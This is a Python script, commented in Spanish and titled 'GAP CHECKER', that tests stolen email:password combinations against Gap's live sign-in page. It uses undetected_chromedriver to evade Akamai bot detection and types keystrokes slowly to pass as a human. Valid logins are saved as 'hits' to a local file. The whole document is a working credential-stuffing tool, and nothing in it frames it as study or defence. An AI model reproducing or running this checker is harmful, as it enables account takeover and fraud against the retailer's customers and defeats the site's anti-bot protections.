import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os

def guardar_hit(email, password):
    with open("gap_hits.txt", "a") as f:
        f.write(f"{email}:{password}\n")
    print(f"  [💾 HIT GUARDADO] en gap_hits.txt")

def check_account_headless(email, password):
    print(f"\n[*] Verificando cuenta (Headless Browser): {email}")
    print(f"[*] Abriendo navegador invisible... (Esto tomará unos 10-15 segundos)\n")
    
    # Configurar opciones del navegador
    options = uc.ChromeOptions()
    # Descomenta la siguiente línea si NO quieres ver la ventana de Chrome abrirse:
    # options.add_argument('--headless=new') 
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    driver = None
    try:
        # Iniciar Chrome (Undetected Chrome bypassa Akamai automáticamente)
        driver = uc.Chrome(options=options)
        
        # PASO 1: Ir a la página de login
        print(f"  [1/3] Cargando página de login...")
        driver.get("https://secure-www.gap.com/my-account/sign-in")
        
        # Esperar hasta que el campo de email aparezca (máximo 20 segundos)
        print(f"  [2/3] Esperando a que Akamai resuelva y cargue la página...")
        wait = WebDriverWait(driver, 20)
        email_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="email"], input[name="loginId"]')))
        
        # Escribir credenciales simulando ser humano
        print(f"  [3/3] Escribiendo credenciales y enviando...")
        email_input.clear()
        # Escribir letra por letra para simular humano (evita detección de keypress rápida)
        for char in email:
            email_input.send_keys(char)
            time.sleep(0.05)
            
        password_input = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
        password_input.clear()
        for char in password:
            password_input.send_keys(char)
            time.sleep(0.05)
            
        # Hacer clic en el botón de Sign In
        login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
        login_button.click()
        
        # Esperar a que la página responda después del clic
        time.sleep(5) # Damos 5 segundos para que cargue la redirección o el error
        
        # PASO 2: Comprobar el resultado
        current_url = driver.current_url
        page_source = driver.page_source.lower()
        
        # Si la URL cambió a "home" o "my-account" sin "sign-in", el login fue exitoso
        if "sign-in" not in current_url and "my-account" in current_url:
            print(f"  [✅ VALIDO] {email}:{password}")
            guardar_hit(email, password)
            
        # Si seguimos en sign-in pero aparece un mensaje de error
        elif "invalid" in page_source or "incorrect" in page_source or "doesn't match" in page_source:
            print(f"  [❌ KO] Credenciales incorrectas: {email}")
            
        # Si nos manda a una página de bloqueo o captcha
        elif "captcha" in page_source or "blocked" in page_source:
            print(f"  [🛑 BLOQUEADO] Akamai detectó el bot en esta cuenta.")
            
        else:
            print(f"  [?] RESULTADO DESCONOCIDO. URL actual: {current_url}")
            
    except Exception as e:
        print(f"  [!] Error durante la automatización: {e}")
        
    finally:
        # Siempre cerrar el navegador para no consumir RAM
        if driver:
            driver.quit()

def main():
    print("=" * 50)
    print("  GAP CHECKER - Headless Browser (PC Only)")
    print("=" * 50)
    
    while True:
        combo = input("\n[?] Ingresa mail:pass (o escribe 'salir'): ").strip()
        if combo.lower() == 'salir': break
        if ":" not in combo:
            print("[!] Formato incorrecto. Debe ser mail:pass")
            continue
            
        email, password = combo.split(":", 1)
        check_account_headless(email, password)

if __name__ == "__main__":
    main()
